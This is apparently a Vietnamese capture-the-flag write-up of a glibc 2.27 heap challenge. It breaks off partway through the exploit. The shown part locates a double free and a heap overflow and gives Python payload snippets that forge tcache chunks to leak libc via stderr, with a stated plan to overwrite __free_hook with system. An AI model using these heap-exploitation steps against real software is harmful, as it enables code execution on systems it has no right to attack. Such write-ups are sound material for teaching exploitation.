**1.Find bug
  - ![image](https://user-images.githubusercontent.com/113702087/220030510-859dae24-8668-41e8-9bde-a9f9eaab5c06.png)
  - PIE và Fortify tắt.
  - ![image](https://user-images.githubusercontent.com/113702087/220022145-4c49d73e-b46c-4791-91fe-aef24fdd12c1.png)
  - chương trình thực hiện nhập name tại 0x602060 và thực thi read data trên heap được cấp phát tại 0x602088, tuy nhiên giới hạn của việc free là 8 lần.
  - Tại hàm info ta có thể in ra name.
  - do libc-2.27 nên ta có thể double free đê gây lỗi uaf.
  - ![image](https://user-images.githubusercontent.com/113702087/220031133-961eedfe-ec72-4ba1-bf49-77ac6223b435.png)
  - ta có thể thấy rằng khi tại hàm Malloc() nó thực hiện read_input(ptr, uint(size - 16)) nếu size < 16 thì có thể read với size lớn gây lỗi heap overflow.
  - Dựa vào các lỗi trên ta có thể leak libc = cách đưa addr libc vào tcache và giải phóng name lúc đó name -> libc, lúc này ta dùng info để leak libc ra. Khi có libc thì có thể overwrite free_hook thành system
  - ta sẽ chọn địa chỉ name+16 là fake chunk và libc là stderr
**2. Exploit**
 # Leak libc
  - Để đưa libc và fakechunk về cùng 1 chunk thì ta cần control size = 0x90 của chunk, với fakechunk thì khá dễ vì ta có thể control nó bằng cách nhập từ name
  - Tạo 4 chunk và giải phóng nó.
  ```
  malloc(size_, b'a')
  freeandinfo(b'2')
  freeandinfo(b'2')
  malloc(size_ + 24, b'aaaa')
  freeandinfo(b'2')
  malloc(size_ + 40, b'aaaa')
  freeandinfo(b'2')
  malloc(size_ + 56, b'aaaa')
  freeandinfo(b'2')
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/220047525-8f9171a4-f8eb-4f37-9ea9-f344ff47e241.png)
  - chunk đầu ta sẽ dùng double free, overflow nó để control các chunk dưới, và chứa lbic_stderr+30 để control size libc_stderr
  - chunk 2 ta đưa stderr, cấp phát vào stderr và thay đổi nó thành libc_stderr-0x30 thay đổi stderr ở chunk 1
  - chunk 3 đưa fakechunk vào để có thể free vào chunk mong muốn ( ở đây là chunk chứa libc)
  - chunk 4 cũng là fakechunk để ta có thể control được ptr vì chương trình đã giới hạn việc free.
  - setup các chunk
  ```
  payload = p64(stderr) + b'\x00'*16 + p64(0x31) + p64(stderr) + b'\x00'*32 + p64(0x41) + p64(name_addr + 16) + b'\x00'*48 + p64(0x51) + p64(name_addr + 16)

  malloc(size_, payload)
  malloc(size_ + 24, b'a')
  malloc(size_ + 24, b'\x50')
  malloc(size_, b'a')
  malloc(size_, b'a')
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/220051030-a5ac7daf-cc2e-4fc3-a0a0-d91c349660ab.png)
  - thay đổi size libc_stderr và đưa vào tcache_c
  ```
  payload = b'\x00'*40 + p64(0x91)
  malloc(size_, payload)
  malloc(size_ + 24, b'\x87')
  freeandinfo(b'2')
  ```
  - 
